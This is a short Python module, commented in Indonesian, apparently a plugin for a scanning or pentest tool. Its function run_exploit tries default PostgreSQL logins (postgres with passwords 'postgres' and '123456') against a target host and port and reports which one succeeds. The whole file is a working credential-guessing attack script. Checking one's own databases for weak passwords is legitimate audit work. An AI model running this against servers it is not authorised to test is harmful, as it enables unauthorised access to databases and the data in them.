import psycopg2


def run_exploit(target: str, port: int, mode: str):
    """Coba login default ke PostgreSQL."""
    print(f"[*] Coba login PostgreSQL ke {target}:{port} (mode {mode})")

    users = ["postgres"]
    passwords = ["postgres", "123456"]

    for user in users:
        for pwd in passwords:
            try:
                conn = psycopg2.connect(
                    dbname="postgres",
                    user=user,
                    password=pwd,
                    host=target,
                    port=port,
                    connect_timeout=3
                )
                print(f"[+] Berhasil login PostgreSQL dengan {user}:{pwd}")
                conn.close()
                return
            except Exception:
                continue

    print("[-] Tidak ada kredensial PostgreSQL lemah ditemukan.")
